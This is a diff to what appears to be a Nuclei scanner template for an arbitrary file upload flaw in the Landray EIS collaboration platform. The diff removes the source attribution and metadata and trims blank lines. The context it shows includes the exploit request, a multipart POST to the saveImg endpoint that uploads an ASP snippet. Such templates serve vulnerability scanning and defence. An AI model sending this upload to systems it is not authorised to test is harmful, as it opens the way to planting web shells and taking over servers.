@@ -3,12 +3,8 @@ info:
   name: 蓝凌EIS智慧协同平台任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nzovmcfa26xu56d5'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nzovmcfa26xu56d5
-    fofa: 暂无
 http:
 - raw:
   - 'POST /eis/service/api.aspx?action=saveImg HTTP/1.1
@@ -32,8 +28,6 @@ http:
     Content-Type: multipart/form-data; boundary=----test
 
 
-
-
     ------test
 
 
@@ -41,8 +35,6 @@ http:
 
 
     Content-Type: text/html
-
-
 
 
     <% response.write("test")%>
